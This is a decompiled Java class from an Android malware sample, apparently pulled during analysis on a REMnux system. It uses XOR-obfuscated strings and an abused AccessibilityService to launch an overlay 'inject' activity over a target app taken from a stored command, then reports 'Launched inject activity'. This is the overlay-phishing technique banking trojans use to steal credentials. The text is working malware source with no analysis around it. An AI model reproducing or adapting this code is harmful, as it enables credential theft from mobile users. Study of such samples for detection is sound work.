package com.zjxyxnvvp.nxvxchltf.i;

import android.accessibilityservice.AccessibilityService;
import android.content.Intent;
import android.view.accessibility.AccessibilityEvent;
import com.zjxyxnvvp.nxvxchltf.UIDNwaidobaWIODb;
import com.zjxyxnvvp.nxvxchltf.d;
import com.zjxyxnvvp.nxvxchltf.inject.uibwduIABuIaw;
import org.json.JSONException;
import org.json.JSONObject;
/* loaded from: /home/remnux/decompressedMalicious.dex */
public class k {
    private static short[] $ = {7318, 7305, 7324, 7319, 7334, 7312, 7319, 7315, 7324, 7322, 7309, 4936, 4953, 4955, 4947, 4953, 4959, 4957, 5296, 5287, 5297, 5303, 5294, 5302, 2488, 2453, 2433, 2458, 2455, 2460, 2449, 2448, 2516, 2461, 2458, 2462, 2449, 2455, 2432, 2516, 2453, 2455, 2432, 2461, 2434, 2461, 2432, 2445};

    private static String $(int i, int i2, int i3) {
        char[] cArr = new char[i2 - i];
        for (int i4 = 0; i4 < i2 - i; i4++) {
            cArr[i4] = (char) ($[i + i4] ^ i3);
        }
        return new String(cArr);
    }

    public static void a(AccessibilityService accessibilityService, AccessibilityEvent accessibilityEvent) {
        d dVar;
        String $2;
        f b2;
        if (accessibilityEvent != null && UIDNwaidobaWIODb.i != null && accessibilityEvent.getPackageName() != null && !UIDNwaidobaWIODb.k && (b2 = (dVar = d.e).c.b(($2 = $(0, 11, 7417)))) != null) {
            String optString = b2.a().optString($(11, 18, 4920));
            if (optString.length() > 0) {
                dVar.f315b.c(true);
                uibwduIABuIaw.c = optString;
                String e = dVar.f314a.e(accessibilityService, optString);
                if (e != null) {
                    uibwduIABuIaw.f338b = e;
                    accessibilityService.startActivity(new Intent(accessibilityService, uibwduIABuIaw.class).addFlags(268435456).addFlags(8388608));
                    JSONObject jSONObject = new JSONObject();
                    try {
                        jSONObject.put($(18, 24, 5314), $(24, 48, 2548));
                    } catch (JSONException e2) {
                        e2.printStackTrace();
                    }
                    dVar.c.e($2, jSONObject);
                }
            }
        }
    }
}
